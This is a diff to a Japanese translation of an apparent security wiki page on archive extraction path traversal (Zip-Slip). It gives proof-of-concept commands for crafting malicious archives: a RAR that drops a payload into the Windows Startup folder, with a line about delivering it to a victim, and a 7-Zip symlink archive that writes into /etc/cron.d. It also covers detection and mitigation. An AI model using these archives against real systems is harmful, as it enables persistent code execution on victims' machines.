@@ -4,18 +4,19 @@
 
 ## 概要
 
-多くのアーカイブ形式（ZIP、RAR、TAR、7-ZIP など）は、各エントリに独自の **internal path** を持たせることができます。抽出ユーティリティがそのパスを無批判に信頼すると、`..` を含む細工されたファイル名や **absolute path**（例: `C:\Windows\System32\`）が、ユーザーが選択したディレクトリの外に書き出されてしまいます。この種の脆弱性は一般に *Zip-Slip* または **archive extraction path traversal** として知られています。
+多くのアーカイブ形式（ZIP、RAR、TAR、7-ZIP など）は、各エントリに独自の**internal path**を持たせることができます。展開ユーティリティがそのパスを盲目的に信用すると、`..` を含む細工されたファイル名や（例：`C:\Windows\System32\` のような）**absolute path** がユーザーの選択したディレクトリの外に書き出されてしまいます。  
+この種の脆弱性は広く *Zip-Slip* または **archive extraction path traversal** として知られています。
 
-影響は任意ファイルの上書きから、Windows の *Startup* フォルダのような自動実行場所にペイロードを置くことでの直接的な **remote code execution (RCE)** まで多岐にわたります。
+影響は任意のファイルの上書きから、Windows *Startup* フォルダのような **auto-run** 場所にペイロードを置くことで直接 **remote code execution (RCE)** を達成されることまで及びます。
 
-## Root Cause
+## 根本原因
 
-1. 攻撃者が次を含むアーカイブを作成する：
-   * 相対トラバーサル列 (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
-   * 絶対パス (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-   * またはターゲットディレクトリ外に解決されるように細工された **symlinks**（*nix* 上の ZIP/TAR で一般的）
-2. 被害者が埋め込まれたパスを検証せず（または symlink を追跡して）信頼する脆弱なツールでアーカイブを展開する。
-3. ファイルが攻撃者制御下の場所に書き込まれ、システムやユーザーがそのパスを次にトリガーしたときに実行／読み込まれる。
+1. 攻撃者は、1つ以上のファイルヘッダーに次のものを含むアーカイブを作成します:
+* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
+* またはターゲットディレクトリの外に解決される細工された **symlinks**（*nix* の ZIP/TAR で一般的）
+2. 被害者は、埋め込まれたパスを信用（または symlinks を辿る）する脆弱なツールでアーカイブを展開し、パスを正規化したり選択したディレクトリの下に強制展開したりしません。
+3. ファイルは攻撃者の制御する場所に書き込まれ、システムやユーザーがそのパスを次にトリガーした際に実行／ロードされます。
 
 ### .NET `Path.Combine` + `ZipArchive` traversal
 
@@ -30,23 +31,23 @@ entry.ExtractToFile(dest);
 }
 }
 ```
-- `entry.FullName` が `..\\` で始まるとディレクトリトラバーサルが発生します。もしそれが **absolute path** であれば、左側のコンポーネントが完全に破棄され、抽出先として **arbitrary file write** を引き起こします。
-- スケジュールされたスキャナにより監視されている同階層の `app` ディレクトリに書き込むための概念実証アーカイブ：
+- `entry.FullName` が `..\\` で始まる場合はトラバーサルが発生します。もしそれが **絶対パス** であれば左側の要素は完全に破棄され、抽出時の識別子として **任意のファイル書き込み** を引き起こします。
+- スケジュールされたスキャナーにより監視される隣接する `app` ディレクトリに書き込むための PoC アーカイブ:
 ```python
 import zipfile
 with zipfile.ZipFile("slip.zip", "w") as z:
 z.writestr("../app/0xdf.txt", "ABCD")
 ```
-その ZIP を監視されている受信トレイに追加すると、`C:\samples\app\0xdf.txt` が生成され、`C:\samples\queue\` の外へのトラバーサルが証明され、後続のプリミティブ（例: DLL hijacks）が可能になります。
+その ZIP を監視された受信トレイに投入すると、`C:\samples\app\0xdf.txt` が生成され、`C:\samples\queue\` の外へのトラバーサルが確認され、後続のプリミティブ（例: DLL hijacks）が可能になります。
 
-## 実例 – WinRAR ≤ 7.12 (CVE-2025-8088)
+## 実世界の例 – WinRAR ≤ 7.12 (CVE-2025-8088)
 
-WinRAR for Windows（`rar` / `unrar` CLI、DLL、およびポータブルソースを含む）は、展開時にファイル名の検証を行いませんでした。
-悪意のある RAR アーカイブが次のようなエントリを含んでいる場合:
+WinRAR for Windows（`rar` / `unrar` CLI、DLL、およびポータブルソースを含む）は、展開時にファイル名の検証を行っていませんでした。
+悪意のある RAR アーカイブが次のようなエントリを含む場合：
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-選択された出力ディレクトリの**外**に出力され、ユーザーの*Startup*フォルダ内に配置されます。ログオン後、Windowsはそこにあるものを自動的に実行するため、*永続的な* RCE を提供します。
+選択された出力ディレクトリの**外**に出力され、ユーザーの*Startup*フォルダ内に配置されます。ログオン後、Windowsはそこにあるすべてを自動的に実行するため、*永続的な*RCEを提供します。
 
 ### PoCアーカイブの作成 (Linux/Mac)
 ```bash
@@ -55,34 +56,34 @@ mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Men
 cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 rar a -ep evil.rar evil/*
 ```
-Options used:
-* `-ep`  – ファイルパスを与えられた通りに保存する（先頭の `./` を削除しないこと）。
+使用オプション:
+* `-ep`  – ファイルパスを与えられた通りに保存する（先頭の `./` を削らない）。
 
 Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.
 
 ### Observed Exploitation in the Wild
 
-ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.
+ESET は RomCom (Storm-0978/UNC2596) のスピアフィッシングキャンペーンを報告しており、CVE-2025-8088 を悪用する RAR アーカイブを添付してカスタムバックドアを展開し、ランサムウェア活動を支援しました。
 
 ## Newer Cases (2024–2025)
 
 ### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
-* **脆弱性**: ZIP エントリが **symbolic links** として含まれている場合、展開時に参照解除され、攻撃者が出力先ディレクトリを脱出して任意のパスを上書きできた。ユーザー操作はアーカイブを*開く/展開する*だけでよい。
-* **影響対象**: 7-Zip 21.02–24.09（Windows & Linux ビルド）。修正は **25.00**（2025年7月）以降。
-* **影響の経路**: `Start Menu/Programs/Startup` やサービス実行箇所を上書き → 次回ログオンやサービス再起動時にコードが実行される。
-* **Quick PoC (Linux)**:
+* **不具合**: ZIP エントリが **シンボリックリンク** の場合、抽出時にリンク先が参照され、攻撃者が展開先ディレクトリを抜け出して任意のパスを上書きできました。利用者の操作はアーカイブを開いて抽出するだけです。
+* **影響**: 7-Zip 21.02–24.09 (Windows & Linux builds)。**25.00**（2025年7月）以降で修正。
+* **影響経路**: `Start Menu/Programs/Startup` やサービス実行箇所を上書き → 次回ログオンやサービス再起動時にコードが実行される。
+* **簡易 PoC (Linux)**:
 ```bash
 mkdir -p out
 ln -s /etc/cron.d evil
 zip -y exploit.zip evil   # -y preserves symlinks
 7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
 ```
-パッチ適用済みビルドでは `/etc/cron.d` は変更されず、シンボリックリンクは /tmp/target 内のリンクとして展開される。
+パッチ適用済みビルドでは `/etc/cron.d` は触られず、シンボリックリンクは /tmp/target 内にリンクとして展開されます。
 
 ### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
-* **脆弱性**: `archiver.Unarchive()` が `../` やシンボリックリンク化された ZIP エントリを追跡し、`outputDir` の外に書き込んでしまう。
-* **影響対象**: `github.com/mholt/archiver` ≤ 3.5.1（プロジェクトは現在非推奨）。
-* **修正**: `mholt/archives` ≥ 0.1.0 に切り替えるか、書き込み前に正規化（canonical-path）チェックを実装する。
+* **不具合**: `archiver.Unarchive()` が `../` やシンボリックリンクされた ZIP エントリを追跡し、`outputDir` の外へ書き込んでしまう。
+* **影響**: `github.com/mholt/archiver` ≤ 3.5.1（プロジェクトは現在非推奨）。
+* **修正**: `mholt/archives` ≥ 0.1.0 に切替えるか、書き込み前に正規パスチェックを実装する。
 * **最小再現例**:
 ```go
 // go test . with archiver<=3.5.1
@@ -92,24 +93,24 @@ archiver.Unarchive("exploit.zip", "/tmp/safe")
 
 ## Detection Tips
 
-* **静的検査** – アーカイブのエントリを列挙し、`../`, `..\\`, *absolute paths* (`/`, `C:`) を含む名前、または展開先ディレクトリの外をターゲットとする *symlink* 型のエントリをフラグする。
-* **正規化** – `realpath(join(dest, name))` が依然として `dest` で始まることを確認する。そうでなければ拒否する。
-* **サンドボックス展開** – 使い捨てディレクトリに、*safe* な抽出ツール（例: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00）で解凍し、生成されたパスがディレクトリ内にとどまることを検証する。
-* **エンドポイント監視** – WinRAR/7-Zip 等でアーカイブが開かれた直後に `Startup`/`Run`/`cron` 配下に新しい実行ファイルが書き込まれた場合にアラートを出す。
+* **静的検査** – アーカイブのエントリを列挙し、`../`, `..\\`, *絶対パス*（`/`, `C:`）を含む名前や、展開先ディレクトリ外を指す *symlink* タイプのエントリがあればフラグを立てる。
+* **正規化チェック** – `realpath(join(dest, name))` が依然として `dest` で始まっていることを確認する。そうでなければ拒否する。
+* **サンドボックスでの抽出** – 使い捨てディレクトリに安全な抽出ツール（例: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00）で展開し、生成されたパスがディレクトリ内に収まっていることを検証する。
+* **エンドポイント監視** – WinRAR/7-Zip 等でアーカイブが開かれた直後に `Startup`/`Run`/`cron` 場所に新しい実行ファイルが書き込まれた場合にアラートを上げる。
 
 ## Mitigation & Hardening
 
-1. **抽出ツールを更新する** – WinRAR 7.13+ と 7-Zip 25.00+ はパス/シンボリックリンクのサニタイズを実装している。両ツールとも自動更新機能は依然として欠如している。
-2. 可能な場合はアーカイブを“**Do not extract paths**” / “**Ignore paths**” で展開する。
-3. Unix では権限を落とし、展開前に **chroot/namespace** をマウントする；Windows では **AppContainer** やサンドボックスを使用する。
-4. カスタムコードを記述する場合は、作成/書き込みの**前に** `realpath()`/`PathCanonicalize()` で正規化し、出力先を逸脱するエントリを拒否する。
+1. **抽出ツールを更新する** – WinRAR 7.13+ と 7-Zip 25.00+ はパス／シンボリックリンクのサニタイズを実装しています。両ツールとも自動更新機能は欠けている点に注意。
+2. 可能な場合はアーカイブを展開するときに “**Do not extract paths**” / “**Ignore paths**” を選択する。
+3. Unix 上では抽出前に権限を落とし **chroot/namespace** をマウントする、Windows 上では **AppContainer** やサンドボックスを使用する。
+4. カスタムコードを書く場合は、作成／書き込みの**前に** `realpath()` / `PathCanonicalize()` で正規化し、展開先を逸脱するエントリは拒否する。
 
 ## Additional Affected / Historical Cases
 
-* 2018 – Snyk による大規模な *Zip-Slip* アドバイザリ（多数の Java/Go/JS ライブラリに影響）。
-* 2023 – 7-Zip CVE-2023-4011、`-ao` マージ時の類似トラバーサル。
-* 2025 – HashiCorp `go-slug` (CVE-2025-0377) の slugs 内 TAR 展開トラバーサル（v1.2 で修正）。
-* 書き込み前に `PathCanonicalize` / `realpath` を呼ばないカスタム抽出ロジック全般。
+* 2018 – Snyk による大規模な *Zip-Slip* 警告（多くの Java/Go/JS ライブラリに影響）。
+* 2023 – 7-Zip CVE-2023-4011、`-ao` マージ中の類似トラバーサル。
+* 2025 – HashiCorp `go-slug` (CVE-2025-0377) の slugs における TAR 抽出トラバーサル（v1.2 で修正）。
+* 書き込み前に `PathCanonicalize` / `realpath` を呼んでいない任意のカスタム抽出ロジック。
 
 ## References
 
